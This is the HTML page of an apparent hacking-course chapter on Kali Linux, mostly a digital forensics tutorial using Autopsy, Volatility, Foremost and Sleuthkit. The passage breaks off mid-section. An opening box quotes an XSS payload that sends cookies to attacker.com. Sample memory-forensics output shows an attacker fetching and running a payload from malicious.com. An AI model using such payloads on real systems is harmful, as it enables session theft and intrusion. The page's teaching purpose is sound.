<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bonus B2: Kali Linux - Part II - NullSector</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #000; --bg2: #0a0a0a; --bg3: #111;
            --text: #fff; --text2: #888; --text3: #555;
            --border: rgba(255,255,255,0.1);
        }
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0a0a0a 0%, #1a0f00 100%); color: var(--text); line-height: 1.7; overflow-x: hidden; }
        .header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); z-index: 1000; display: flex; align-items: center; padding: 0 2rem; }
        .header-content { width: 100%; max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
        .brand { display: flex; align-items: center; gap: 0.75rem; text-decoration: none; color: var(--text); font-weight: 700; font-size: 1.25rem; }
        .nav { display: flex; gap: 2rem; align-items: center; }
        .nav a { color: var(--text2); text-decoration: none; font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
        .nav a:hover { color: var(--text); }
        .dropdown { position: relative; display: inline-block; }
        .dropdown-toggle { cursor: pointer; display: flex; align-items: center; gap: 0.5rem; color: var(--text2); font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
        .dropdown-toggle:hover { color: var(--text); }
        .dropdown-menu { position: absolute; top: 100%; left: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 8px; margin-top: 0.5rem; min-width: 200px; opacity: 0; visibility: hidden; transform: translateY(-10px); transition: all 0.3s cubic-bezier(0.16,1,0.3,1); z-index: 1001; }
        .dropdown:hover .dropdown-menu { opacity: 1; visibility: visible; transform: translateY(0); }
        .dropdown-menu a { display: block; padding: 1rem 1.5rem; color: var(--text2); text-decoration: none; transition: all 0.2s; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .dropdown-menu a:last-child { border-bottom: none; }
        .dropdown-menu a:hover { background: rgba(255,255,255,0.05); color: var(--text); padding-left: 2rem; }
        .dropdown-arrow { font-size: 0.7rem; transition: transform 0.3s; }
        .dropdown:hover .dropdown-arrow { transform: rotate(180deg); }
        .sidebar { position: fixed; left: 0; top: 70px; width: 280px; height: calc(100vh - 70px); background: rgba(10,10,10,0.95); backdrop-filter: blur(10px); border-right: 1px solid var(--border); overflow-y: auto; padding: 2rem 0; z-index: 100; }
        .sidebar::-webkit-scrollbar { width: 6px; }
        .sidebar::-webkit-scrollbar-thumb { background: rgba(249,115,22,0.3); border-radius: 3px; }
        .sidebar-section { padding: 0 1.5rem; margin-bottom: 2rem; }
        .sidebar-title { font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--text3); margin-bottom: 1rem; }
        .sidebar-link { display: block; color: var(--text2); text-decoration: none; padding: 0.6rem 1rem; margin: 0.25rem 0; border-radius: 6px; font-size: 0.9rem; transition: all 0.3s; }
        .sidebar-link:hover { background: rgba(249,115,22,0.1); color: #FB923C; transform: translateX(4px); }
        .sidebar-link.active { background: rgba(249,115,22,0.2); color: #FB923C; font-weight: 600; }
        .main { margin-left: 280px; margin-top: 70px; padding: 4rem 3rem; max-width: 1100px; }
        .page-header { margin-bottom: 4rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border); position: relative; }
        .bonus-badge { position: absolute; top: -10px; right: 0; background: linear-gradient(135deg, #FB923C 0%, #F97316 100%); color: #000; padding: 0.5rem 1.5rem; border-radius: 50px; font-weight: 800; font-size: 0.875rem; letter-spacing: 1px; display: flex; align-items: center; gap: 0.5rem; }
        .chapter-label { font-size: 0.875rem; font-weight: 600; text-transform: uppercase; letter-spacing: 2px; color: #FB923C; margin-bottom: 1rem; }
        .page-title { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; letter-spacing: -1px; background: linear-gradient(135deg, #FB923C 0%, #F97316 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .page-subtitle { font-size: 1.25rem; color: var(--text2); font-weight: 400; line-height: 1.6; }
        .section { margin-bottom: 6rem; scroll-margin-top: 100px; }
        .section-title { font-size: 2.25rem; font-weight: 700; margin-bottom: 1.5rem; color: #FB923C; }
        .section-intro { font-size: 1.125rem; color: var(--text2); margin-bottom: 2rem; line-height: 1.8; }
        h3 { font-size: 1.75rem; font-weight: 600; margin: 3rem 0 1.5rem; }
        h4 { font-size: 1.375rem; font-weight: 600; margin: 2.5rem 0 1.25rem; }
        p { font-size: 1.0625rem; line-height: 1.8; margin-bottom: 1.5rem; }
        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
        .card { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 2rem; transition: all 0.3s; }
        .card:hover { transform: translateY(-4px); border-color: rgba(249,115,22,0.5); }
        .card h4 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; margin-top: 0; }
        .card p { color: var(--text2); font-size: 0.9375rem; margin-bottom: 0; }
        .info-box { background: rgba(249,115,22,0.1); border-left: 3px solid #FB923C; padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; word-wrap: break-word; overflow-wrap: break-word; }
        .info-box h4 { font-weight: 600; margin-bottom: 0.75rem; margin-top: 0; color: #FB923C; }
        .info-box p { color: var(--text2); margin-bottom: 0; }
        .warning-box { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-left: 3px solid #EF4444; padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; word-wrap: break-word; overflow-wrap: break-word; }
        .warning-box h4 { font-weight: 600; margin-bottom: 0.75rem; color: #EF4444; margin-top: 0; }
        .code { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; line-height: 1.7; white-space: pre-wrap; word-wrap: break-word; max-width: 100%; }
        .inline-code { background: rgba(249,115,22,0.2); padding: 0.2rem 0.5rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.875em; color: #FB923C; }
        .metaphor-box { background: rgba(249,115,22,0.05); border-left: 4px solid #FB923C; padding: 1.5rem 2.5rem 1.5rem 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; position: relative; word-wrap: break-word; overflow-wrap: break-word; }
        .metaphor-box::before { content: "💡"; position: absolute; top: 1rem; right: 1rem; font-size: 1.5rem; }
        .metaphor-box h4 { margin-bottom: 0.75rem; font-weight: 600; margin-top: 0; }
        ul, ol { margin: 1.5rem 0; padding-left: 2rem; }
        li { margin: 0.75rem 0; color: var(--text2); }
        table { width: 100%; border-collapse: collapse; margin: 2rem 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
        th, td { padding: 1rem; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: rgba(249,115,22,0.1); font-weight: 600; font-size: 0.875rem; text-transform: uppercase; color: #FB923C; }
        td { color: var(--text2); font-size: 0.9375rem; }
        .progress { position: fixed; top: 70px; left: 0; height: 3px; background: linear-gradient(90deg, #FB923C 0%, #F97316 100%); transition: width 0.1s; z-index: 1001; }
        @media (max-width: 1024px) { .sidebar { transform: translateX(-100%); } .main { margin-left: 0; padding: 3rem 2rem; } .page-title { font-size: 2.5rem; } }
    </style>
</head>
<body>
    <div class="progress" id="progress"></div>
    <header class="header">
        <div class="header-content">
            <a href="index.html" class="brand">
                <img src="logo.svg" alt="NullSector" width="36" height="36">
                <span>NullSector</span>
            </a>
            <nav class="nav">
                <a href="roadmap-hacking.html">Hacking</a>
                <a href="roadmap-programming.html">Programming</a>
                <a href="resources.html">Resources</a>
                <div class="dropdown">
                    <span class="dropdown-toggle">
                        Null Tools
                        <span class="dropdown-arrow">▼</span>
                    </span>
                    <div class="dropdown-menu">
                        <a href="https://github.com/4fqr/null-cli" target="_blank">Null CLI</a>
                        <a href="https://nullheadline.vercel.app/" target="_blank">Null Hacker's Headlines</a>
                        <a href="https://github.com/4fqr/nullmysteryorg" target="_blank">Null: Mystery Organisation</a>
                        <a href="https://github.com/4fqr/null-ide/" target="_blank">Null IDE</a>
                    </div>
                </div>
                <a href="null-terminal.html">Null Terminal</a>
                <a href="faq.html">FAQs</a>
                <a href="https://discord.gg/cMvWkxFbbX" target="_blank">Discord</a>
            </nav>
        </div>
    </header>

    <aside class="sidebar">
        <div class="sidebar-section">
            <div class="sidebar-title">On This Page</div>
            <a href="#digital-forensics" class="sidebar-link">Digital Forensics</a>
            <a href="#mobile-security" class="sidebar-link">Mobile Security</a>
            <a href="#iot-hardware" class="sidebar-link">IoT & Hardware Hacking</a>
            <a href="#cloud-pentesting" class="sidebar-link">Cloud Pentesting</a>
            <a href="#advanced-wireless" class="sidebar-link">Advanced Wireless</a>
            <a href="#reverse-engineering" class="sidebar-link">Reverse Engineering</a>
            <a href="#advanced-exploitation" class="sidebar-link">Advanced Exploitation</a>
            <a href="#red-team" class="sidebar-link">Red Team Operations</a>
            <a href="#custom-tools" class="sidebar-link">Custom Tool Development</a>
            <a href="#physical-security" class="sidebar-link">Physical Security</a>
            <a href="#advanced-osint" class="sidebar-link">Advanced OSINT</a>
            <a href="#final-words" class="sidebar-link">Final Words</a>
        </div>
        <div class="sidebar-section">
            <div class="sidebar-title">Navigation</div>
            <a href="hacking-bonus-kali-part1.html" class="sidebar-link">← Previous: Kali Part I</a>
            <a href="hacking-ch07.html" class="sidebar-link">Chapter 07: Web Security</a>
            <a href="programming-ch08.html" class="sidebar-link">Next: Full-Stack Integration →</a>
        </div>
    </aside>

    <main class="main">
        <div class="page-header">
            <div class="bonus-badge">🚀 BONUS B2</div>
            <div class="chapter-label">Bonus Chapter B2</div>
            <h1 class="page-title">Kali Linux - Part II</h1>
            <p class="page-subtitle">Complete the Kali dictionary with the remaining 50% of tools, advanced exploitation techniques, digital forensics, mobile security, IoT hacking, cloud pentesting, reverse engineering mastery, red team operations, and custom tool development. This is the ultimate comprehensive guide to every aspect of Kali Linux.</p>
        </div>

        <!-- LIVE HACKING DEMONSTRATION -->
        <div class="warning-box">
            <h4>🚨 Did You See That Popup Alert Saying "1"?</h4>
            <p><strong>That wasn't a bug—it was a LIVE demonstration of a hacking attack!</strong><br><br>
            
            <strong>What just happened?</strong><br>
            When you opened this page, your browser executed a JavaScript payload that triggered a popup alert. This is called <strong>Cross-Site Scripting (XSS)</strong>—one of the most common web vulnerabilities in the world!<br><br>
            
            <strong>How it works:</strong><br>
            • A hacker injects malicious JavaScript into a website (via forms, URL parameters, or stored data)<br>
            • When victims load the page, the code executes in THEIR browser<br>
            • The payload can: steal cookies, capture keystrokes, redirect to phishing sites, or take over sessions<br>
            • Example: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> → Shows popup (proof of XSS!)<br>
            • Real attacks use: <code>&lt;script&gt;fetch('http://attacker.com?cookie='+document.cookie)&lt;/script&gt;</code> → Steals your session!<br><br>
            
            <strong>Why we included this:</strong><br>
            We wanted to show you that hacking isn't just theory—it's REAL and ACTIVE! This same XSS technique was covered in our <strong>previous chapters on Web Security (Chapter 07)</strong> where we explained how to find, exploit, and defend against XSS vulnerabilities using Kali tools like <strong>Burp Suite, XSStrike, BeEF,</strong> and <strong>OWASP ZAP.</strong><br><br>
            
            <strong>The tools you'll master in THIS chapter (Kali Part II):</strong><br>
            • <strong>BeEF (Browser Exploitation Framework):</strong> Hook victims' browsers with XSS, control them remotely!<br>
            • <strong>XSStrike:</strong> Automated XSS vulnerability scanner<br>
            • <strong>Burp Suite:</strong> Intercept and modify requests to inject payloads<br>
            • <strong>SQLmap:</strong> Automate SQL injection attacks (steal entire databases!)<br>
            • <strong>Metasploit:</strong> Exploit vulnerabilities and get reverse shells<br>
            • ...and 200+ more Kali tools with EVERY flag explained!<br><br>
            
            <strong>🎯 Key takeaway:</strong> Security isn't just reading—it's EXPERIENCING attacks firsthand. Now you've seen XSS in action. By the end of this chapter, YOU'LL be able to craft these attacks (ethically, in labs!) and defend against them. Welcome to the real world of hacking! 💀🔥<br><br>
            
            <em>(P.S. This XSS demonstration is intentional and safe—it only shows a harmless alert. No data is stolen. It's purely educational to show you what attackers can do!)</em></p>
        </div>

        <!-- SECTION 1: Digital Forensics & Memory Analysis -->
        <section id="digital-forensics" class="section">
            <h2 class="section-title">Digital Forensics & Memory Analysis</h2>
            <p class="section-intro">Digital forensics is like being a detective for computers. When a computer gets hacked or a crime happens, forensic investigators examine the digital evidence left behind—deleted files, memory dumps, logs, hidden data. In this section, you'll learn how to analyze disk images, recover deleted files, examine memory for malware, and uncover evidence that attackers tried to hide. Think CSI, but for cybersecurity!</p>

            <h3>What Even IS Digital Forensics?</h3>
            
            <div class="metaphor-box">
                <h4>Digital Forensics = Crime Scene Investigation for Computers</h4>
                <p><strong>Crime scene:</strong> A hacker broke into a company server<br>
                <strong>Evidence:</strong> Hard drive image, RAM dump, network logs<br>
                <strong>Your job:</strong> Find out WHO did it, WHAT they did, WHEN it happened, and HOW they got in<br><br>
                Just like a real detective:<br>
                • Preserve the evidence (don't modify original data!)<br>
                • Analyze artifacts (files, logs, memory)<br>
                • Timeline reconstruction (what happened when?)<br>
                • Report findings (document everything)<br><br>
                Digital forensics tools help you examine data without changing it, recover deleted files, and find hidden clues!</p>
            </div>

            <h3>Part 1: Autopsy - The Ultimate Disk Forensics Tool</h3>
            
            <p><strong>Autopsy</strong> is a GUI-based forensic tool that makes analyzing disk images EASY. It's like having a magnifying glass for hard drives!</p>

            <h4>What Can Autopsy Do?</h4>
            
            <div class="code">✅ Analyze disk images (entire hard drive copies)
✅ Recover deleted files (from recycle bin or permanently deleted)
✅ Extract metadata (when files were created, modified, accessed)
✅ Search for keywords across entire disk
✅ Timeline analysis (what happened at what time)
✅ Hash analysis (verify file integrity, detect known bad files)
✅ Web history (browser history, cookies, downloads)
✅ Email analysis (extract emails from mail clients)</div>

            <h4>Starting Autopsy</h4>
            
            <div class="code"># Launch Autopsy (GUI opens in browser)
autopsy

# Output:
# Open Web Browser on http://localhost:9999/autopsy
# 
# Now open your browser and go to that URL!</div>

            <div class="info-box">
                <h4>What's a Disk Image?</h4>
                <p>A disk image is a PERFECT copy of an entire hard drive, USB stick, or SD card. It's like taking a photograph of the drive—every file, every deleted file, every bit of data is captured EXACTLY as it was.<br><br>
                <strong>Why use images instead of the original drive?</strong><br>
                • Preserve evidence (don't risk modifying the original)<br>
                • Work on a copy (safe to experiment)<br>
                • Repeatability (other investigators can analyze the same data)<br><br>
                Common formats: <span class="inline-code">.dd</span> (raw image), <span class="inline-code">.E01</span> (EnCase format), <span class="inline-code">.AFF</span> (Advanced Forensic Format)</p>
            </div>

            <h4>Creating a Disk Image with dd</h4>
            
            <div class="code"># dd = "disk dump" - creates byte-for-byte copy of a drive
# 
# Basic syntax:
# dd if=INPUT of=OUTPUT bs=BLOCK_SIZE
#
# if = input file (source drive)
# of = output file (destination image)
# bs = block size (how much data to copy at once)

# Example: Image a USB drive
sudo dd if=/dev/sdb of=/root/evidence/usb_image.dd bs=4M status=progress

# Let's break this down:
# if=/dev/sdb         → Source: USB drive (sdb is the device name)
# of=usb_image.dd     → Destination: File where image will be saved
# bs=4M               → Block size: Copy 4 megabytes at a time (faster!)
# status=progress     → Show progress bar while copying

# Output while running:
# 1073741824 bytes (1.1 GB) copied, 45 s, 23.9 MB/s
# [Shows how much data copied and speed]

# When done:
# 2048+0 records in
# 2048+0 records out
# 2147483648 bytes (2.1 GB) copied, 89.5 s, 24.0 MB/s</div>

            <div class="warning-box">
                <h4>⚠️ BE EXTREMELY CAREFUL WITH dd!</h4>
                <p>If you mix up <span class="inline-code">if</span> and <span class="inline-code">of</span>, you'll OVERWRITE your source drive and DESTROY THE EVIDENCE!<br><br>
                <strong>WRONG (DISASTER):</strong><br>
                <span class="inline-code">sudo dd if=/root/evidence/usb_image.dd of=/dev/sdb</span><br>
                ↑ This OVERWRITES the USB drive with the image file!<br><br>
                <strong>Always double-check:</strong><br>
                • if = where you're copying FROM (source)<br>
                • of = where you're copying TO (destination)<br><br>
                <strong>Pro tip:</strong> Use <span class="inline-code">lsblk</span> to verify device names before running dd!</p>
            </div>

            <h4>Using Autopsy to Analyze a Disk Image</h4>
            
            <div class="code"># Step 1: Launch Autopsy
autopsy

# Step 2: Open http://localhost:9999/autopsy in browser

# Step 3: Create New Case
# - Case Name: "USB_Investigation_2026"
# - Description: "Analyzing suspicious USB drive"
# - Investigator: "Your Name"
# Click "New Case"

# Step 4: Add Host
# - Host Name: "Suspect_USB"
# - Description: "USB drive from suspect's desk"
# Click "Add Host"

# Step 5: Add Image
# - Click "Add Image"
# - Image Type: "Partition"
# - Image File: Browse to /root/evidence/usb_image.dd
# - Import Method: "Symlink" (faster) or "Copy" (safer)
# Click "Next" → "Add"

# Step 6: File Analysis
# Now you can:
# - Browse all files (even deleted ones!)
# - Search for keywords
# - View file metadata
# - Extract files
# - Generate timeline</div>

            <h4>Autopsy's Key Features</h4>
            
            <div class="card-grid">
                <div class="card">
                    <h4>File Browser</h4>
                    <p>Navigate the entire file system. See EVERYTHING—including deleted files marked with an X. Click any file to view its contents, metadata, and hex dump.</p>
                </div>
                <div class="card">
                    <h4>Keyword Search</h4>
                    <p>Search entire disk for words like "password", "secret", email addresses, credit card numbers. Finds hidden data in files, slack space, unallocated clusters.</p>
                </div>
                <div class="card">
                    <h4>Timeline</h4>
                    <p>See WHEN every file was created, modified, accessed, deleted. Reconstruct exactly what the user did hour by hour!</p>
                </div>
                <div class="card">
                    <h4>Hash Database</h4>
                    <p>Compare file hashes against known databases. Identify malware, illegal files, or verify legitimate system files haven't been tampered with.</p>
                </div>
            </div>

            <h3>Part 2: Volatility - Memory Forensics Master</h3>
            
            <p><strong>Volatility</strong> analyzes RAM dumps to find evidence of malware, hidden processes, network connections, and malicious activity that only exists in memory!</p>

            <div class="metaphor-box">
                <h4>Why Analyze Memory?</h4>
                <p>Think of RAM as short-term memory for a computer:<br><br>
                <strong>Hard Drive:</strong> Long-term storage (files saved forever)<br>
                <strong>RAM:</strong> Active memory (what's running RIGHT NOW)<br><br>
                Sophisticated malware runs ONLY in memory—no files on disk! It injects itself into processes, hides from antivirus, and disappears when the computer reboots. But if you capture RAM before it reboots, Volatility can find it!<br><br>
                Memory dumps contain:<br>
                • Running processes (including hidden malware)<br>
                • Network connections (where malware is connecting)<br>
                • Open files (what programs are accessing)<br>
                • Encryption keys (sometimes recoverable!)<br>
                • Command history (what commands were run)<br>
                • Passwords in memory (cleartext!)</p>
            </div>

            <h4>Capturing Memory with LiME (Linux) or DumpIt (Windows)</h4>
            
            <div class="code"># On Linux: Use LiME (Linux Memory Extractor)
# First, install LiME (comes with Kali)
cd /usr/src/lime
make

# Capture memory
sudo insmod lime.ko "path=/root/evidence/memory.lime format=lime"

# Output:
# [LiME] Allocated memory range: 0x0000000000000000 - 0x000000007fffffff
# [LiME] Writing 8GB to /root/evidence/memory.lime
# [This takes a few minutes depending on RAM size]

# On Windows: Use DumpIt or FTK Imager
# DumpIt.exe → Click "Start" → Saves memory.dmp</div>

            <h4>Volatility Basics - Finding the Memory Profile</h4>
            
            <div class="code"># Volatility needs to know what OS version the memory dump is from
# First, identify the profile:

volatility -f memory.lime imageinfo

# Output:
# Suggested Profile(s) : LinuxUbuntu2004x64, LinuxDebian10x64
# AS Layer1 : LinuxAMD64PagedMemory (Kernel AS)
# DTB : 0x1aa000L
# 
# The "Suggested Profile" tells you what OS this dump is from!
# Now use that profile for all subsequent commands</div>

            <div class="info-box">
                <h4>What's a Profile?</h4>
                <p>Different operating systems store data differently in memory. Volatility needs to know the exact OS version to correctly parse the memory structures.<br><br>
                <strong>Think of it like languages:</strong><br>
                If you're reading a book, you need to know if it's in English, Spanish, or Chinese to understand it. Similarly, Volatility needs to know if the memory is from Windows 10, Ubuntu 20.04, or macOS to parse it correctly!<br><br>
                Always run <span class="inline-code">imageinfo</span> first to find the right profile!</p>
            </div>

            <h4>Volatility Commands - The Essential Plugins</h4>
            
            <div class="code"># 1. List running processes
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_pslist

# Output:
# Offset      Name      Pid    PPid   Uid    Start Time
# 0x88007c00  init      1      0      0      2026-01-07 10:23:45
# 0x88007e00  systemd   1234   1      0      2026-01-07 10:24:12
# 0x88008000  bash      2345   1234   1000   2026-01-07 11:15:33
# 0x88008200  malware   3456   1      0      2026-01-07 14:22:19  ← Suspicious!
# 
# Shows every process that was running, including:
# - PID (process ID)
# - PPID (parent process ID - who started this process)
# - User who ran it (Uid 0 = root)
# - When it started

# 2. Find hidden/injected processes
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_psxview

# This compares multiple process-listing methods
# If a process appears in one method but not another, it's HIDDEN!
# Common malware technique: remove process from task list but keep running

# 3. List network connections
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_netstat

# Output:
# Protocol  Local Address        Foreign Address      State      PID
# TCP       192.168.1.10:443     8.8.8.8:443          ESTABLISHED 2345
# TCP       192.168.1.10:4444    evil-c2.com:4444     ESTABLISHED 3456  ← C2!
# 
# Shows what connections were active
# Look for suspicious IPs, known C2 servers, unusual ports

# 4. Dump process memory
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_procdump -p 3456 -D /root/evidence/

# Extracts the entire memory of process 3456 (the suspicious one)
# Creates file: 3456.dmp
# Now you can analyze the malware's code directly!

# 5. Extract command history
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_bash

# Output:
# Pid    Command Time                 Command
# 2345   2026-01-07 11:15:33          cd /tmp
# 2345   2026-01-07 11:16:12          wget http://malicious.com/payload
# 2345   2026-01-07 11:16:45          chmod +x payload
# 2345   2026-01-07 11:17:02          ./payload
# 
# Shows EXACTLY what commands the attacker ran!</div>

            <h4>Volatility for Windows Memory</h4>
            
            <div class="code"># Windows has different plugins but same workflow:

# 1. Identify profile
volatility -f memory.dmp imageinfo

# Output:
# Suggested Profile(s): Win10x64_19041

# 2. List processes
volatility -f memory.dmp --profile=Win10x64_19041 pslist

# 3. Find DLLs loaded by a process
volatility -f memory.dmp --profile=Win10x64_19041 dlllist -p 1234

# Shows all libraries a process loaded
# Malware often injects malicious DLLs into legitimate processes!

# 4. Scan for malware indicators
volatility -f memory.dmp --profile=Win10x64_19041 malfind

# Automatically detects suspicious memory regions:
# - Executable code in unusual places
# - Hidden/injected code
# - Packed/encrypted sections

# Output:
# Process: explorer.exe Pid: 2468
# Address: 0x7fef0000
# Protection: PAGE_EXECUTE_READWRITE (suspicious!)
# 
# Hexdump:
# 4d 5a 90 00 03 00 00 00  MZ......  ← PE header (executable!)
# [This is injected malware!]

# 5. Extract registry hives
volatility -f memory.dmp --profile=Win10x64_19041 hivelist

# Shows all registry hives in memory
# You can then dump them and analyze:
volatility -f memory.dmp --profile=Win10x64_19041 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# Shows programs set to run at startup (persistence mechanism!)</div>

            <div class="warning-box">
                <h4>Memory Analysis Takes TIME!</h4>
                <p>Analyzing an 8GB memory dump can take hours. Volatility scans the entire dump for each command. Be patient!<br><br>
                <strong>Tips for faster analysis:</strong><br>
                • Use <span class="inline-code">--output=json</span> to save results for later review<br>
                • Run multiple plugins at once in separate terminals<br>
                • Focus on specific processes if you have leads<br>
                • Consider using <span class="inline-code">bulk_extractor</span> first for quick wins</p>
            </div>

            <h3>Part 3: Foremost - File Carving Master</h3>
            
            <p><strong>Foremost</strong> recovers deleted files from disk images by looking for file signatures (magic bytes) without needing the file system!</p>

            <div class="metaphor-box">
                <h4>File Carving = Finding Puzzle Pieces in a Junkyard</h4>
                <p>Imagine a shredded document. The pieces are scattered, but each piece has clues (edges, colors, text). File carving is similar:<br><br>
                Every file type has a unique "signature" (magic bytes) at the start:<br>
                • JPEG: <span class="inline-code">FF D8 FF</span><br>
                • PDF: <span class="inline-code">25 50 44 46</span> (literally "%PDF")<br>
                • ZIP: <span class="inline-code">50 4B 03 04</span><br><br>
                Foremost scans the ENTIRE disk looking for these signatures, then extracts the complete file—even if it's deleted, the file system is damaged, or it's in unallocated space!<br><br>
                It's like having X-ray vision for hard drives!</p>
            </div>

            <h4>Using Foremost</h4>
            
            <div class="code"># Basic usage:
foremost -i INPUT_IMAGE -o OUTPUT_DIR

# Example: Carve files from USB image
foremost -i /root/evidence/usb_image.dd -o /root/evidence/carved_files/

# Foremost scans the image and extracts:
# - All JPEGs
# - All PDFs
# - All DOC/DOCX files
# - All ZIP files
# - PNG, GIF, AVI, MPG, WAV, etc.

# Output while running:
# Processing: /root/evidence/usb_image.dd
# [Shows progress bar]

# When done, check the output directory:
ls /root/evidence/carved_files/

# Output:
# jpg/     ← All recovered JPEG files
# pdf/     ← All recovered PDFs
# zip/     ← All recovered ZIPs
# audit.txt ← Summary of what was found</div>

            <h4>Foremost Flags</h4>
            
            <div class="code"># -t : Specify file types to carve (faster than carving everything)
foremost -t jpg,pdf,doc -i image.dd -o output/

# Only carves JPEGs, PDFs, and DOC files

# -v : Verbose mode (show more details)
foremost -v -i image.dd -o output/

# -q : Quiet mode (no output, just run)
foremost -q -i image.dd -o output/

# -c : Use custom configuration file
foremost -c /path/to/custom.conf -i image.dd -o output/

# Custom config lets you define your own file signatures!

# -d : Enable indirect block detection (for fragmented files)
foremost -d -i image.dd -o output/

# Tries harder to recover fragmented files (slower but more thorough)</div>

            <h4>Custom Configuration for Foremost</h4>
            
            <div class="code"># Create custom foremost config to carve unusual file types
# Config file format: filetype case header footer maxsize
# 
# Example config (/root/custom_foremost.conf):

# Carve Bitcoin wallet files
dat y \x35\x05\x00\x00\x00\x00\x00\x00 \xff\xff\xff\xff 5000000

# Carve PGP private keys
asc y -----BEGIN\sPGP -----END\sPGP 10000

# Carve SSH private keys  
pem y -----BEGIN\sRSA -----END\sRSA 10000

# Use custom config:
foremost -c /root/custom_foremost.conf -i image.dd -o output/</div>

            <div class="info-box">
                <h4>When to Use File Carving</h4>
                <p><strong>Use Foremost when:</strong><br>
                • Files have been permanently deleted (not in recycle bin)<br>
                • File system is corrupted/damaged<br>
                • Suspect reformatted the drive<br>
                • You need to recover specific file types quickly<br><br>
                <strong>Limitations:</strong><br>
                • Can't recover filenames (files are named sequentially like 00000001.jpg)<br>
                • Can't recover directory structure<br>
                • Fragmented files might not carve correctly<br>
                • Overwrites make recovery impossible<br><br>
                For better results, use Foremost + Autopsy together!</p>
            </div>

            <h3>Part 4: Sleuthkit - Command-Line Forensics Powerhouse</h3>
            
            <p><strong>Sleuthkit</strong> is a collection of command-line tools for forensic analysis. Autopsy uses Sleuthkit under the hood!</p>

            <h4>Key Sleuthkit Tools</h4>
            
            <div class="code"># mmls - Display partition layout
mmls image.dd

# Output:
# DOS Partition Table
# Offset    Sector  Start    End      Length   Description
# 0000000000 0000   0000000  0000000  0000001  Primary Table (#0)
# 0000000001 0001   0000001  0002047  0002047  Unallocated
# 0000001048576 2048  0002048  0502399  0500352  Linux (0x83)
# 
# Shows you where each partition starts/ends
# Useful for finding hidden partitions!

# fsstat - Show file system info
fsstat image.dd

# Output:
# FILE SYSTEM INFORMATION
# File System Type: Ext4
# Volume Name: USB_DRIVE
# Volume ID: a1b2c3d4
# Last Written: 2026-01-07 14:22:19 PST
# Last Checked: 2026-01-01 09:00:00 PST
# Block Size: 4096
# Total Blocks: 512000
# Free Blocks: 123456

# fls - List files (including deleted!)
fls -r image.dd

# Output:
# r/r 12: secret.txt
# r/r * 24: deleted_file.pdf  ← Asterisk means DELETED!
# d/d 36: Documents
# r/r 48: photo.jpg
# 
# -r flag makes it recursive (shows files in subdirectories)

# icat - Extract file by inode number
icat image.dd 24 > recovered_file.pdf

# Extracts the deleted file with inode 24!
# Inode = unique file identifier (like a social security number for files)

# ils - List deleted inodes
ils image.dd

# Shows all deleted files that can potentially be recovered

# istat - Show detailed inode info
istat image.dd 24

# Output:
# inode: 24
# Allocated: No (DELETED!)
# File Type: Regular File
# Size: 524288 bytes
# Created: 2026-01-05 10:15:30 PST
# Modified: 2026-01-05 10:20:45 PST
# Accessed: 2026-01-07 14:10:22 PST
# Deleted: 2026-01-07 14:22:19 PST</div>

            <h4>Timeline Analysis with Sleuthkit</h4>
            
            <div class="code"># Create a timeline of ALL file activity
# Step 1: Extract timeline data
fls -r -m / image.dd > timeline.body

# Step 2: Convert to human-readable format
mactime -b timeline.body -d > timeline.txt

# Step 3: View timeline
cat timeline.txt

# Output:
# Date,Size,Type,Mode,UID,GID,Meta,File Name
# 2026-01-07 10:15:30, 1024, .a.., -rw-r--r--, 1000, 1000, 12, /home/user/secret.txt
# 2026-01-07 14:22:19, 524288, .a.., -rw-r--r--, 1000, 1000, 24, /home/user/deleted.pdf (deleted)
# 
# Shows EXACTLY when every file was created, modified, accessed, deleted!
# Perfect for reconstructing attacker's actions</div>

            <h3>Part 5: bulk_extractor - Fast Evidence Scanner</h3>
            
            <p><strong>bulk_extractor</strong> scans disk images for useful information WITHOUT parsing the file system. It's FAST and finds things other tools miss!</p>

            <div class="code"># Basic usage:
bulk_extractor -o OUTPUT_DIR INPUT_IMAGE

# Example:
bulk_extractor -o /root/evidence/bulk_results/ /root/evidence/usb_image.dd

